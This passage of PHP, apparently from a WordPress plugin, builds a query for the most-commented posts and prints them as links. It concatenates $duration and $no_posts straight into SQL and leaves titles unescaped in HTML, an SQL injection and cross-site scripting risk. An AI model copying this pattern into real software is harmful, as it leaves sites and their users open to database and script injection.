	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>